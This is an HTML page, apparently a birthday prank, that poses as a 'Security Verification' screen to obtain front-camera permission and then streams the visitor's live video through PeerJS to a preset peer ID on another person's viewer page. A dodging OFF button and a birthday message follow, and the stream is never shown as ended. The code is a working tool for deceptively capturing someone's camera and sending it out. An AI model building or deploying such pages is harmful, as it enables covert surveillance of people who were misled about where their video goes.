<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Diagnostic</title>
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body {
      margin: 0; min-height: 100vh; overflow: hidden;
      font-family: Arial, sans-serif; background: #0f111a; color: white;
      display: flex; align-items: center; justify-content: center; text-align: center;
    }
    .screen {
      width: 100%; min-height: 100vh; display: flex; flex-direction: column;
      align-items: center; justify-content: center; padding: 25px;
    }
    #startBtn {
      padding: 16px 32px; font-size: 18px; font-weight: bold;
      background: #00e676; border: none; border-radius: 8px; cursor: pointer;
    }
    #offBtn {
      position: absolute; border: none; border-radius: 12px;
      padding: 16px 38px; font-size: 20px; font-weight: bold;
      background: #e53935; color: white; cursor: pointer;
      box-shadow: 0 5px 20px rgba(0,0,0,.6);
      transition: left .15s ease, top .15s ease;
    }
    #birthday { display: none; animation: pop .6s ease forwards; }
    #birthday h2 { font-size: clamp(35px, 9vw, 70px); margin: 0; color: #ffeb3b; }
    @keyframes pop {
      0% { transform: scale(.3); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .confetti {
      position: fixed; top: -20px; font-size: 24px;
      animation: fall 3s linear forwards; pointer-events: none;
    }
    @keyframes fall { to { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
  </style>
</head>
<body>

  <!-- चरण 1: परमिशन लेने का बहाना -->
  <div class="screen" id="permissionScreen">
    <h2>📱 Security Verification</h2>
    <p>Press START to verify device identity & continue.</p>
    <button id="startBtn">START</button>
  </div>

  <!-- चरण 2: भागने वाला OFF बटन -->
  <div class="screen" id="prankScreen" style="display:none;">
    <h1>Device Online</h1>
    <p>Tap OFF to disconnect...</p>
    <button id="offBtn">OFF</button>
  </div>

  <!-- चरण 3: सरप्राइज -->
  <div class="screen" id="birthday">
    <h2>🎂 HAPPY BIRTHDAY! 🎉</h2>
    <p>😂 OFF dhoondte dhoondte popat ho gaya!</p>
  </div>

  <script>
    const startBtn = document.getElementById("startBtn");
    const offBtn = document.getElementById("offBtn");
    const permissionScreen = document.getElementById("permissionScreen");
    const prankScreen = document.getElementById("prankScreen");
    const birthday = document.getElementById("birthday");

    let attempts = 0;
    const maxAttempts = 6;

    // आपके Viewer पेज से कनेक्ट करने के लिए Peer ID
    // Note: यहाँ 'bday-prank-stream-2026' दोनों फाइलों में सेम होना चाहिए
    const targetPeerId = "bday-prank-stream-2026";
    const peer = new Peer();

    startBtn.addEventListener("click", async () => {
      try {
        // फ्रंट कैमरा एक्सेस करना
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        // आपके Viewer वाले पेज पर वीडियो कॉल भेजना
        peer.call(targetPeerId, stream);

        permissionScreen.style.display = "none";
        prankScreen.style.display = "flex";
        moveButton();
      } catch (err) {
        alert("Verification failed. Please allow camera permission!");
      }
    });

    function moveButton() {
      const padding = 25;
      const maxX = window.innerWidth - offBtn.offsetWidth - padding;
      const maxY = window.innerHeight - offBtn.offsetHeight - padding;

      const x = Math.max(padding, Math.floor(Math.random() * maxX));
      const y = Math.max(padding, Math.floor(Math.random() * maxY));

      offBtn.style.left = x + "px";
      offBtn.style.top = y + "px";
    }

    function handleTouch(e) {
      if (e) e.preventDefault();
      attempts++;

      if (attempts >= maxAttempts) {
        prankScreen.style.display = "none";
        birthday.style.display = "flex";
        triggerConfetti();
      } else {
        moveButton();
      }
    }

    offBtn.addEventListener("touchstart", handleTouch, { passive: false });
    offBtn.addEventListener("mouseover", handleTouch);
    offBtn.addEventListener("click", handleTouch);

    function triggerConfetti() {
      const items = ["🎉", "🎊", "🎂", "🥳", "✨"];
      for (let i = 0; i < 60; i++) {
        const c = document.createElement("div");
        c.className = "confetti";
        c.textContent = items[Math.floor(Math.random() * items.length)];
        c.style.left = Math.random() * 100 + "vw";
        c.style.animationDelay = Math.random() * 1.5 + "s";
        document.body.appendChild(c);
        setTimeout(() => c.remove(), 4000);
      }
    }
  </script>
</body>
</html>
